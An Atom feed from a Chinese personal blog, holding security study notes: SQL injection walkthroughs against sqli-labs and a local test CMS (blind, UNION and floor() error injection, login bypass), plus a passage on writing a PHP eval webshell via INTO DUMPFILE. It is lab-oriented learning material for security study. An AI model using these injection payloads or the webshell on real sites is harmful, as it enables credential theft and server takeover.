<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>han个人博客</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-08-28T16:19:34.504Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>han</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Welcome</title>
    <link href="http://yoursite.com/2019/08/29/welcome/"/>
    <id>http://yoursite.com/2019/08/29/welcome/</id>
    <published>2019-08-28T16:19:00.000Z</published>
    <updated>2019-08-28T16:19:34.504Z</updated>
    
    <content type="html"><![CDATA[<!-- excerpt -->]]></content>
    
    <summary type="html">
    
      &lt;center&gt;&lt;font size=&quot;5&quot;&gt;记录  学习  分享&lt;/font&gt;&lt;/center&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>练习10</title>
    <link href="http://yoursite.com/2019/08/28/practice10/"/>
    <id>http://yoursite.com/2019/08/28/practice10/</id>
    <published>2019-08-28T11:40:45.000Z</published>
    <updated>2019-08-29T00:15:40.757Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: SQL 盲注总结，目标站点是 <code>sqli-labs</code> 中的 <code>Less-8</code></p><a id="more"></a><!--export--><!--toc--><h3 id="找注入点"><a href="#找注入点" class="headerlink" title="找注入点"></a>找注入点</h3><p>拿到一个目标站点首先找到注入点，<code>Less-8</code> 注入点为 <code>?id=1</code></p><h3 id="判断类型"><a href="#判断类型" class="headerlink" title="判断类型"></a>判断类型</h3><p>发现输入 <code>id=1&#39;</code> 后页面的 <code>You are in ...</code> 消失了，没有报错信息。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1'</span><br></pre></td></tr></table></figure><p>再次输入</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' --+</span><br></pre></td></tr></table></figure><p>页面正常显示，所以该注入点为字符型注入，由于页面不显示错误信息，所以使用盲注的方法。</p><h3 id="判断数据库个数"><a href="#判断数据库个数" class="headerlink" title="判断数据库个数"></a>判断数据库个数</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and (select count(schema_name) from information_schema.schemata)&gt;4 --+</span><br></pre></td></tr></table></figure><p><img src="/images/127errorInjec_count.png" alt></p><p>发现 <code>&gt;4</code>正常显示，<code>&gt;5</code>不正常，故可知数据库个数为 5。</p><h3 id="判断各数据库名的长度"><a href="#判断各数据库名的长度" class="headerlink" title="判断各数据库名的长度"></a>判断各数据库名的长度</h3><p>先判断第一个数据库名的长度</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and length((select schema_name from information_schema.schemata limit 0,1))&gt;17 --+</span><br></pre></td></tr></table></figure><p><img src="/images/128fires_schemata_length.png" alt></p><p>可得第一个库的长度为 18 。</p><h3 id="判断数据库名"><a href="#判断数据库名" class="headerlink" title="判断数据库名"></a>判断数据库名</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and ascii(mid((select schema_name from information_schema.schemata limit 0, 1), 1, 1)) &gt;104 --+</span><br></pre></td></tr></table></figure><p>可得第一个字符为 <code>i</code> 。</p><p><img src="/images/125errorInjec_schema.png" alt></p><p>继续往下做判断</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and ascii(mid((select schema_name from information_schema.schemata limit 0, 1), 1, 1)) &gt;109 --+</span><br></pre></td></tr></table></figure><p><img src="/images/126errorInjec_judge_schemata.png" alt></p><p>可得第二个字符是 <code>n</code></p><p>可以以此判断出数据库中各个库名。</p><h3 id="判断当前数据库中表的个数"><a href="#判断当前数据库中表的个数" class="headerlink" title="判断当前数据库中表的个数"></a>判断当前数据库中表的个数</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())&gt;3 --+</span><br></pre></td></tr></table></figure><p><img src="/images/129count_current_database_tables.png" alt></p><h3 id="判断当前数据库中各个表名的长度"><a href="#判断当前数据库中各个表名的长度" class="headerlink" title="判断当前数据库中各个表名的长度"></a>判断当前数据库中各个表名的长度</h3><p>先判断第一个表名长度</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;1 --+</span><br></pre></td></tr></table></figure><p><img src="/images/130count_current_table_length.png" alt></p><h3 id="判断当前数据库中表名"><a href="#判断当前数据库中表名" class="headerlink" title="判断当前数据库中表名"></a>判断当前数据库中表名</h3><p>判断第一个表名</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0, 1), 1, 1)) &gt;100 --+</span><br></pre></td></tr></table></figure><p><img src="/images/130juage_table_name.png" alt></p><p>字符为 <code>e</code> ，继续判断可以得出该表名为 <code>emails</code>。</p><h3 id="查看-users-表中字段个数"><a href="#查看-users-表中字段个数" class="headerlink" title="查看 users 表中字段个数"></a>查看 <code>users</code> 表中字段个数</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users') &gt; 2 --+</span><br></pre></td></tr></table></figure><p><img src="/images/131.png" alt></p><p>个数为 3 。</p><h3 id="判断-users-表中第一个字段长度"><a href="#判断-users-表中第一个字段长度" class="headerlink" title="判断 users 表中第一个字段长度"></a>判断 <code>users</code> 表中第一个字段长度</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and length((select column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 0,1)) &gt; 1 --+</span><br></pre></td></tr></table></figure><p>第一个字段长度为 2 。</p><h3 id="判断第一个字段"><a href="#判断第一个字段" class="headerlink" title="判断第一个字段"></a>判断第一个字段</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and ascii(mid((select column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 0, 1), 1, 1)) &gt;104 --+</span><br></pre></td></tr></table></figure><p><img src="/images/133.png" alt></p><p>不难判断出第一个字段为 <code>id</code>。</p><h3 id="判断users-表行数"><a href="#判断users-表行数" class="headerlink" title="判断users 表行数"></a>判断<code>users</code> 表行数</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and (select count(*) from security.users) &gt;13 --+</span><br></pre></td></tr></table></figure><p><img src="/images/134.png" alt></p><p>可以查看 <code>users</code>表中的内容。</p><h3 id="总结-SQL-盲注流程"><a href="#总结-SQL-盲注流程" class="headerlink" title="总结 SQL 盲注流程"></a>总结 SQL 盲注流程</h3><ol><li>先找注入点</li><li>判断类型<ol><li>字符型？整型？</li><li>盲注还是 <code>UNION SELECT</code></li></ol></li><li>先查一共有几个数据库</li><li>再查各个数据库长度，为判断库名做准备</li><li>依次判断出数据库的名称，找到自己想要查询的库</li><li>先查库中有几个表</li><li>查各个表的长度</li><li>依次判断出各个表名</li><li>查表中有几个字段</li><li>查各个字段长度</li><li>依次判断字段名</li><li>判断出想要字段的数据</li></ol><h3 id="用burpsuite判断"><a href="#用burpsuite判断" class="headerlink" title="用burpsuite判断"></a>用burpsuite判断</h3><p>把要做判断的 <code>url</code> 发送到 <code>Intruder</code></p><p><img src="/images/135.png" alt></p><p>点击 <code>Clear $</code> ，在 <code>=%27i%27</code> 中字母 <code>i</code> 两边加上 <code>$</code> ，然后点击 <code>Payloads</code>，在 <code>Payload type</code> 选择 <code>Brute forcer</code>，<code>Min length</code> 选择 <code>1</code>，<code>Max length</code> 选择 <code>1</code>。</p><p><img src="/images/136.png" alt></p><p>然后点击 <code>Start attack</code></p><p><img src="/images/137.png" alt></p><p><img src="/images/138.png" alt></p><p>继续改变位置可查出库名，同理表名，字段名也可以查出。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: SQL 盲注总结，目标站点是 &lt;code&gt;sqli-labs&lt;/code&gt; 中的 &lt;code&gt;Less-8&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
    
      <category term="SQL盲注" scheme="http://yoursite.com/tags/SQL%E7%9B%B2%E6%B3%A8/"/>
    
  </entry>
  
  <entry>
    <title>note33</title>
    <link href="http://yoursite.com/2019/08/28/note33/"/>
    <id>http://yoursite.com/2019/08/28/note33/</id>
    <published>2019-08-28T11:37:48.000Z</published>
    <updated>2019-08-28T16:20:00.749Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: SQL 盲注</p><a id="more"></a><!--export--><!--toc--><h3 id="URL-注释"><a href="#URL-注释" class="headerlink" title="URL 注释"></a><code>URL</code> 注释</h3><ol><li><code>-- |</code> 空格后面可以跟上任何字符</li><li><code>--+</code> <code>URL</code> 中会把 <code>+</code> 解析为空格</li><li><code>#</code> 识别为锚点</li></ol><p><code>GET</code> 参数会被 <code>url</code> 编码，但 <code>POST</code> 参数不会被 <code>url</code> 编码，请求头也不会编码。</p><p>整型 <code>id=26-1</code>可以用，但 <code>id=3+9</code> 却不能用，因为 <code>+</code> 解析为空格。</p><table><thead><tr><th align="center">符号</th><th align="center"><code>url</code> 编码</th></tr></thead><tbody><tr><td align="center">空格</td><td align="center">%20</td></tr><tr><td align="center">‘</td><td align="center">%27</td></tr><tr><td align="center">#</td><td align="center">%23</td></tr><tr><td align="center">“</td><td align="center">%22</td></tr><tr><td align="center">%</td><td align="center">%25</td></tr><tr><td align="center">&amp;</td><td align="center">%26</td></tr><tr><td align="center">/</td><td align="center">%2F</td></tr></tbody></table><h3 id="十种-MySQL-报错注入"><a href="#十种-MySQL-报错注入" class="headerlink" title="十种 MySQL 报错注入"></a>十种 <code>MySQL</code> 报错注入</h3><ul><li><code>floor()</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure><p><code>floor()</code> 报错注入准确地说应该是 <code>floor</code>，<code>count</code>，<code>group by</code> 冲突报错。特定情况下，三个函数在一起使用会产生错误。</p><p>经典的 <code>floor</code> 注入语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure><p>首先看 <code>floor()</code> 报错产生条件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*), concat(database(), floor(rand(0)*2))x from security.users group by x</span><br></pre></td></tr></table></figure><p>语句中 <code>x</code> 是给 <code>floor(rand(0)*2)</code>添加一个别名，执行该语句得到： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!#1062 - Duplicate entry &apos;security1&apos; for key &apos;&lt;group_key&gt;&apos;</span><br></pre></td></tr></table></figure><p><code>floor()</code> 报错原理分析：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(), floor(rand(0)*2) as x from information_schema_tables groupby a;</span><br></pre></td></tr></table></figure><p>重点在 <code>group by a</code> ，即 <code>group by floor(rand(0)*2)</code>。首先，<code>floor(rand(0)*2)</code> 意思是随机产生 0 或 1。虽说是随机的，但有规律可循，基本上是 <code>011011</code>这个序列。</p><p>为什么报错？</p><p>首先，系统会建立一个虚拟表：</p><table><thead><tr><th align="center">key</th><th align="center">count(*)</th></tr></thead><tbody><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr></tbody></table><p>假设有表：</p><table><thead><tr><th align="center">id</th><th align="center">name</th><th align="center">age</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">11</td><td align="center">18</td></tr><tr><td align="center">2</td><td align="center">22</td><td align="center">19</td></tr><tr><td align="center">3</td><td align="center">33</td><td align="center">20</td></tr><tr><td align="center">4</td><td align="center">44</td><td align="center">20</td></tr><tr><td align="center">5</td><td align="center">55</td><td align="center">18</td></tr></tbody></table><p>执行 <code>count(*) from ... group by age</code> 的过程中，会形成这样的虚拟表：</p><table><thead><tr><th align="center">key</th><th align="center">count(*)</th></tr></thead><tbody><tr><td align="center">18</td><td align="center">2</td></tr><tr><td align="center">19</td><td align="center">1</td></tr><tr><td align="center">20</td><td align="center">2</td></tr></tbody></table><p>那么这个表是如何形成的？由于 <code>group by</code> 的是 <code>age</code>，第一次读取的是 18 ，在虚拟表中寻找是否已经存在 18 ，由于表是空的，直接插入一条新数据，这时虚拟表变成这样：</p><table><thead><tr><th align="center">key</th><th align="center">count(*)</th></tr></thead><tbody><tr><td align="center">18</td><td align="center">1</td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr></tbody></table><p>下一个时 19 ，由于虚拟表中依旧没有 key 为 19 的字段，故插入。再插入 20 ，和 19 的情况一样，当继续插入 第二个 20 时，由于已经有了 20 ，故将 key 为 20 的字段的 count(*) 的值加 1，依次类推，形成最后的虚拟表：</p><table><thead><tr><th align="center">key</th><th align="center">count(*)</th></tr></thead><tbody><tr><td align="center">18</td><td align="center">2</td></tr><tr><td align="center">19</td><td align="center">1</td></tr><tr><td align="center">20</td><td align="center">2</td></tr></tbody></table><p>如何将 <code>group by</code> 与 <code>floor</code> 联合起来，进行 <code>floor</code> 报错？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(), floor(rand(0)*2) as a from information_schema.tables group by a;</span><br></pre></td></tr></table></figure><p><code>group by</code> 的是 <code>floor(rand(0)*2)</code> 每次运算的值都是随机的，首先，建立一张虚拟表，</p><table><thead><tr><th align="center">key</th><th align="center">count(*)</th></tr></thead><tbody><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr></tbody></table><p>接着，进行 <code>group by floor(rand(0)*2)</code> 。floor 表达式第一次运算的值为 0 ，在表中没有找到 key 为 0 的数据，故插入，在插入过程中需要再取一次  group by 后面的值，即在执行一次 floor 运算，结果为 1，取到了 1 ，插入数据，并将 count() 置 1.</p><table><thead><tr><th align="center">key</th><th align="center">count(*)</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">1</td></tr><tr><td align="center"></td><td align="center"></td></tr></tbody></table><p>再进行 group by floor(rand(0)2)，表为</p><table><thead><tr><th align="center">key</th><th align="center">count(*)</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">2</td></tr><tr><td align="center"></td><td align="center"></td></tr></tbody></table><p>执行到第四次 floor 运算时，这次值为 0 ，表中没有找到 key 为 0 的数据，故应当插入一条新数据，插入时，进行 floor 运算，这时值为 1，将 count(*) 置 1 。但虚拟表中已经有了 key 为 1数据，故此时会抛出主键冗余的异常，这就是所谓的 floor 报错。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: SQL 盲注&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="SQL 盲注" scheme="http://yoursite.com/tags/SQL-%E7%9B%B2%E6%B3%A8/"/>
    
  </entry>
  
  <entry>
    <title>练习9</title>
    <link href="http://yoursite.com/2019/08/27/practice9/"/>
    <id>http://yoursite.com/2019/08/27/practice9/</id>
    <published>2019-08-27T12:22:54.000Z</published>
    <updated>2019-08-27T13:00:34.857Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 对新闻管理系统进行 SQL 注入</p><a id="more"></a><!--export--><!--toc--><h3 id="UNION-SELECT-注入"><a href="#UNION-SELECT-注入" class="headerlink" title="UNION SELECT 注入"></a>UNION SELECT 注入</h3><p><a href="http://192.168.100.166/display.php" target="_blank" rel="noopener">测试网址</a></p><h4 id="判断类型"><a href="#判断类型" class="headerlink" title="判断类型"></a>判断类型</h4><p>首先进入到一个电影介绍页面，网址上有 <code>id</code> 可能存在 SQL 注入</p><p>先在 把<code>id=3</code>改成 <code>id=3-1</code> 发现内容改变了，故可得为整型，若为字符型则内容不变。 </p><h4 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h4><p>因为整型注入故直接在后面加上<code>order by</code> 即可，发现字段数为 3</p><p><img src="/images/110.png" alt></p><p>然后先用</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.166/display.php?id=-1 UNION SELECT 1,2,3</span><br></pre></td></tr></table></figure><p>判断各字段输出的位置，然后再正式开始 SQL 注入</p><h4 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h4><h5 id="查看数据库名"><a href="#查看数据库名" class="headerlink" title="查看数据库名"></a>查看数据库名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.166/display.php?id=-1 UNION SELECT 1,(SELECT group_concat(SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA),3</span><br></pre></td></tr></table></figure><p><img src="/images/111.png" alt></p><p>可以看书我们所需要查看的表名是 <code>mynews</code></p><h5 id="查看-mynews-库中的表名"><a href="#查看-mynews-库中的表名" class="headerlink" title="查看 mynews 库中的表名"></a>查看 <code>mynews</code> 库中的表名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.166/display.php?id=-1 UNION SELECT 1,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),3</span><br></pre></td></tr></table></figure><p><img src="/images/112.png" alt></p><h5 id="查看-tb-users-表中的列名"><a href="#查看-tb-users-表中的列名" class="headerlink" title="查看 tb_users 表中的列名"></a>查看 <code>tb_users</code> 表中的列名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.166/display.php?id=-1 UNION SELECT 1,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=&apos;tb_users&apos;,3</span><br></pre></td></tr></table></figure><p><img src="/images/113.png" alt></p><h5 id="查看-username-和-password-字段的数据"><a href="#查看-username-和-password-字段的数据" class="headerlink" title="查看 username 和 password 字段的数据"></a>查看 <code>username</code> 和 <code>password</code> 字段的数据</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.166/display.php?id=-1 UNION SELECT 1,(SELECT GROUP_CONCAT(username, &apos;-&apos;, password) FROM `db_mynews`.`tb_users`),3</span><br></pre></td></tr></table></figure><p><img src="/images/114.png" alt></p><h4 id="排序功能注入"><a href="#排序功能注入" class="headerlink" title="排序功能注入"></a>排序功能注入</h4><p>分析：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM news WHERE title like &apos;%1%&apos; or content like &apos;%1%&apos; or author like &apos;%1%&apos; order by &apos;%1%&apos;</span><br></pre></td></tr></table></figure><p>首先要判断查询时，哪个字段在前面，否则会影响后面注入过程。</p><p>排序界面有三列，分别为标题，内容和作者。所以我们要从这三个方向入手。经过简单的试错，我们可以判断出来标题在最前面。</p><p>然后再搜索框输入 <code>好%&#39; ORDER BY 3</code> 显示正常，然后再修改为 <code>好%&#39; UNION SELECT 1,2,3#</code></p><p><img src="/images/115.png" alt></p><p>把第二个位置换成 <code>user()</code></p><p><img src="/images/116.png" alt></p><p>然后就可以继续进行其他信息的查询了，和前面一样，这里不再重复。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 对新闻管理系统进行 SQL 注入&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
    
      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>note32</title>
    <link href="http://yoursite.com/2019/08/27/note32/"/>
    <id>http://yoursite.com/2019/08/27/note32/</id>
    <published>2019-08-27T11:15:58.000Z</published>
    <updated>2019-08-27T12:21:05.441Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 万能密码，SQL 注入的分类以及简单的 SQL 注入</p><a id="more"></a><!--export--><!--toc--><h3 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h3><p>搭建好环境后，关机快照，虚拟机不要留下任何关于自己的信息，禁止虚拟机和物理机的连接，虚拟机的主机名随意取，每做完一次渗透后，恢复到初始化快照。</p><p>重视：主机名+时间+电量+剪切板</p><h3 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h3><h4 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `TABLE_NAME` WHERE `username` = &apos;admin&apos; AND `password`= &apos;password&apos;</span><br></pre></td></tr></table></figure><p>当用户输入 <code>admin&#39; or 1 #</code> 时，带入上面的语句为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `TABLE_NAME` WHERE `username` = &apos;admin&apos; or 1 # &apos; AND `password`=&apos;password&apos;</span><br><span class="line">#多行结果，需要碰运气，在验证密码时，有一个用户密码是我们输入的密码</span><br><span class="line">SELECT * FROM `TABLE_NAME` WHERE `username` = &apos;admin&apos; or 1 # &apos; AND `password`=&apos;password&apos;</span><br><span class="line">#一行结果，admin的没用，因为不知道admin密码，验证密码会失败</span><br></pre></td></tr></table></figure><p>可以明显看到后面的有关查询密码的句子被注释掉了，前面是个永真条件。即这条 SQL 语句查询的是所有用户名，登录之后只显示一条数据，有可能是第一条也有可能是其他，具体看程序如何解析。</p><p>要想只输出一条语句可以用下面语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#1. 直接把后面全部注释掉   admin&apos; #</span><br><span class="line">SELECT * FROM `TABLE_NAME` WHERE `username` = &apos;admin&apos; # &apos; AND `password`=&apos;password&apos;</span><br><span class="line">#2. 把or换成and      admin&apos; and 1 #</span><br><span class="line">SELECT * FROM `TABLE_NAME` WHERE `username` = &apos;admin&apos; or 1 # &apos; AND `password`=&apos;password&apos;</span><br><span class="line">#3. 加入limit限制        admin&apos; or 1 limit 0,1 #</span><br><span class="line">SELECT * FROM `TABLE_NAME` WHERE `username` = &apos;admin&apos; or 1 # &apos; AND `password`=&apos;password&apos;</span><br></pre></td></tr></table></figure><p>做用户登录功能时，有两种实现思路，一种是像上面这样直接用用户名和密码查询，另一种是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `TABLE_NAME` WHERE `username` = &apos;admin&apos;;</span><br></pre></td></tr></table></figure><p>然后再用 <code>if(查询出来的密码和输入的密码是否相等)</code> 来判断，实现方法不同，具体的注入手段也不同，应具体问题具体分析。</p><h4 id="SQL-注入原理介绍"><a href="#SQL-注入原理介绍" class="headerlink" title="SQL 注入原理介绍"></a>SQL 注入原理介绍</h4><p>当 Web 应用向后台数据库传递 SQL 语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊 SQL 语句，直接输入数据库引擎执行，获取和修改数据库中的数据。</p><p><strong>SQL 注入漏洞本质</strong>：把用户输入的数据当做代码来执行，违背了 “<strong>数据与代码分离</strong>“的原则。</p><p><strong>SQL 注入漏洞两个关键条件</strong>：</p><ul><li>用户能控制输入的内容</li><li>Web 应用把用户输入的内容带入到数据库中执行</li></ul><h4 id="SQL-注入分类"><a href="#SQL-注入分类" class="headerlink" title="SQL 注入分类"></a>SQL 注入分类</h4><p><strong>根据请求不同可以分为</strong>：</p><ul><li>GET 请求方式注入</li><li>POST 请求方式注入</li><li>请求头</li></ul><p><strong>根据 SQL 注入点的类型参数分为</strong>：</p><ul><li>整型注入</li><li>字符型注入</li></ul><p><strong>只要有数据提交到数据库中的地方就可能存在注入点</strong></p><p>如何区整数型字和字符型</p><ol><li><p>数字-1      判断字符型和数字型</p><p>结果不变   →     不是数字型</p></li><li><p>右边加 ‘ 无数据 无 SQL 错误   →   不一定有注入</p></li><li><p>右边加 ‘ # 有数据 →  有注入</p></li></ol><p><strong>根据 SQL 注入点的反馈类型可分为</strong>：</p><ul><li>基于错误显示的 SQL 注入</li><li>UNION 类型的 SQL 注入</li><li>布尔类型的 SQL 注入</li><li>基于时间的 SQL 注入</li><li>多语句</li><li>内联</li></ul><p><strong>根据 Web 应用常用的数据库类型分类</strong>：</p><ul><li><p>MySQL 数据库注入</p></li><li><p>SQLServer 数据库注入</p></li><li><p>Oracle 数据库注入</p></li><li><p>Access数据库注入</p></li><li><p>MongoDB 数据库注入</p></li></ul><p><strong>注入方法分类</strong>：</p><ul><li>直接页面看到数据<ul><li>UNION SELECT</li><li>报错</li></ul></li><li>一个一个字母判断值<ul><li>布尔盲注</li><li>时间延时注入</li><li>内联</li></ul></li><li>多语句</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 万能密码，SQL 注入的分类以及简单的 SQL 注入&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>note31</title>
    <link href="http://yoursite.com/2019/08/27/note31/"/>
    <id>http://yoursite.com/2019/08/27/note31/</id>
    <published>2019-08-27T11:15:53.000Z</published>
    <updated>2019-08-27T15:28:29.671Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: webshall 的原理，中国菜刀、AntSword 和 Behinder 的使用。</p><a id="more"></a><!--export--><!--toc--><h3 id="学习目的"><a href="#学习目的" class="headerlink" title="学习目的"></a>学习目的</h3><ul><li>熟悉 PHP 命令执行的函数</li><li>理解什么是 webshell</li><li>能够写出一句话木马</li><li>能够利用大马</li><li>熟练中国菜刀的使用</li><li>理解 webshell 的变形</li></ul><h3 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h3><p>Phpmyadmin</p><p>​    getshell 一般情况下，两种操作方式</p><p>SQL 语句 into outfile</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &quot;123&quot; INTO DUMPFILE &quot;绝对路径&quot;; # 直接写文件</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &quot;&lt;?php @eval($_POST[&apos;pass&apos;])?&gt;&quot; INTO DUMPFILE &quot;C:/phpStudy/PHPTutorial/www/a.php&quot;;</span><br></pre></td></tr></table></figure><p><code>--secure-file-priv option</code></p><p>源代码拷贝到网站根目录中，之后修改权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown -R apache: apache /var/www/html</span><br></pre></td></tr></table></figure><p>一定要弄清楚权限</p><p>php 代码    apache用户</p><p>数据库操作 SQL 语句       mysql 用户</p><p>mysql 日志写 webshell</p><p>mysql 每执行一个 sql 语句，就会把 sql 语句写入到文件日志中，但默认情况下，这个选项是关闭的，因此需要去开启这个选项，再设置日志路径，日志路径设置为网站目录，日志文件名字为 .php 